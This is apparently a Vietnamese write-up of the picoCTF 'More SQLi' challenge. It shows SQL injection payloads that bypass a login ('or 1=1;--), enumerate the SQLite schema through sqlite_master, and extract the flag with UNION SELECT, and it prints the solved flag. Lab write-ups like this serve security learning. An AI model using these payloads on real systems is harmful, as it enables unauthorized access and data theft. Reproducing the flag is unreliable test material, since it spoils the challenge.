# More SQLi
Challenge này cho chúng ta 1 website, với gợi ý khai thác là `SQLiLite`. Ấn vào link trang web, ta thấy giao diện trang web hiện ra như sau:

![image](https://github.com/user-attachments/assets/fb3b6a37-3ca4-4db5-9196-b91b1564e3c3)

Hãy thử gõ gì đó vào phần `login`.

Trang web trả về một truy vấn **SQL**. Ta thấy rằng hệ thống có nguy cơ dễ bị `SQL Injection`, và ta có thể lợi dụng điều đó đễ vượt qua bước xác thực mà không cần đúng `Username` và `Password`.

``` sql
username: ádasdasd
password: ádasdasd
SQL query: SELECT id FROM users WHERE password = 'ádasdasd' AND username = 'ádasdasd'
```

Ta sẽ nhập câu lệnh sau:

``` sql
'or 1=1;--
```

Giải thích về câu lệnh trên:
- Dấu `'` sẽ kết thúc chuỗi nhập đầu vào
- `or 1=1` luôn đúng

Lúc này truy vấn sẽ thành:

``` sql
username: 'or 1=1;-- 
password: 'or 1=1;--
SQL query: SELECT id FROM users WHERE password = ''or 1=1;-- AND username = 'ádasdasd'
```

Nghĩa là điều kiện `password` đúng và phần `username` phía sau bị vô hiệu hóa bởi vì dấu `;` là dấu kết thúc câu lệnh SQL còn dấu `--` là dấu comment trong SQL ( tương tự như `#` trong Python và `//` như C++).

Và ta đã `login` thành công:

![image](https://github.com/user-attachments/assets/903fa554-720c-4e76-ae50-0dbbab3ec600)

Ta thấy web hiển thị một bảng thông tin và một thanh tìm kiếm. Nhìn qua thì có vẻ không thấy flag ở đâu cả, có lẽ rằng ta sẽ tiếp tục khai thác bằng `SQL` khác để tìm flag.

Ta nhập câu lệnh sau:

``` sql
' UNION SELECT sql, 1, 1 FROM sqlite_master;--
```

Giải thích về câu lệnh trên:
- Dấu `'` sẽ kết thúc chuỗi nhập đầu vào
- `UNION SELECT` sẽ gộp kết quả từ 2 truy vấn `SELECT` (phải làm vậy vì ta cần mở rộng truy vấn dựa trên truy vấn gốc của website).
- `sql, 1, 1` là tên một cột trong bảng hệ thống `sqlite_master` của `SQLite`, chứa câu lệnh tạo bảng (ở bài này là `CREATE TABLE`.).
- `FROM sqlite_master` là bảng hệ thống trong SQLite, chứa thông tin về tất cả các bảng
- `;--` đã giải thích trước đó.

Câu lệnh này được dùng trong tấn công `SQL Injection` trên cơ sở dữ liệu SQLite, để lấy thông tin cấu trúc cơ sở dữ liệu như tên bảng, tên cột, và câu lệnh `CREATE TABLE`.

Kết quả là ta thấy được các bảng được tạo ra:

![image](https://github.com/user-attachments/assets/be8a669e-8acc-4c8f-ae0c-150558ab013b)

Ta thấy bảng `more_table` có chứa flag trong đó:

``` sql
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
```

Giờ ta sẽ lấy flag trong đó bằng câu lệnh:

``` sql
' UNION SELECT flag, 1, 1 FROM more_table;--
```

Tương tự như câu lệnh trước đó, với câu lệnh này thì ta sẽ mở cột `flag` trong bảng `more_table`.

![image](https://github.com/user-attachments/assets/c6f9da13-6225-453a-a8a7-acf30306d283)

Và ta có flag:

```  
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
```
